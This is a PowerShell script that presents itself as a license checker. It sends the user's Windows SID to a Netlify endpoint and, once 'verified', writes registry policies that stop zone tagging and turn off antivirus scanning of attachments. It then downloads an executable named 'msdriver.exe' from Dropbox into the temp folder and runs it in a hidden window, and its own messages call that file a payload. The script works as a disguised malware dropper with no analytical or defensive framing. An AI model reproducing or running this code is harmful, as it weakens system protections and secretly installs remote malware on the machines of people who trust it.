# Set TLS
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Get SID
try {
    $sid = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
    Write-Host "[-] SID: $sid"
} catch {
    Write-Host "[x] Failed to get SID"; exit
}

# Call API
$apiUrl = "https://orphues2apix.netlify.app/.netlify/functions/checkSid?sid=$sid"
try {
    $response = Invoke-RestMethod -Uri $apiUrl -Method Get
} catch {
    Write-Host "[x] Network Error"; exit
}

# Check result
if ($response.success -eq $true) {
    Write-Host "[+] License Verified: $($response.message)"
    Write-Host "[+] License Key: $($response.key)"
    
    # Optional: restart ctfmon
    try {
        Stop-Process -Name "ctfmon" -Force -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 500
        Start-Process "C:\Windows\System32\ctfmon.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
    } catch {
        Write-Host "[!] ctfmon restart failed: $_"
    }

    # Change registry (requires admin)
    try {
        reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" /v SaveZoneInformation /t REG_DWORD /d 2 /f | Out-Null
        reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" /v ScanWithAntiVirus /t REG_DWORD /d 2 /f | Out-Null
    } catch {
        Write-Host "[!] Registry changes failed"
    }

    # Optional: Download executable
    $destination = "$env:TEMP\msdriver.exe"
    $url = "https://dl.dropboxusercontent.com/scl/fi/8sr5ikslqkn4q81aoortf/msdriver.exe?rlkey=836a8lb540w926f2fzj9ew5vm&st=s5e7o6k5"
    try {
        Invoke-WebRequest -Uri $url -OutFile $destination -ErrorAction Stop
        Start-Sleep -Seconds 2
        Start-Process -FilePath $destination -WindowStyle Hidden
    } catch {
        Write-Host "[!] Failed to download or run payload"
    }

} else {
    Write-Host "[x] License Check Failed: $($response.message)"
}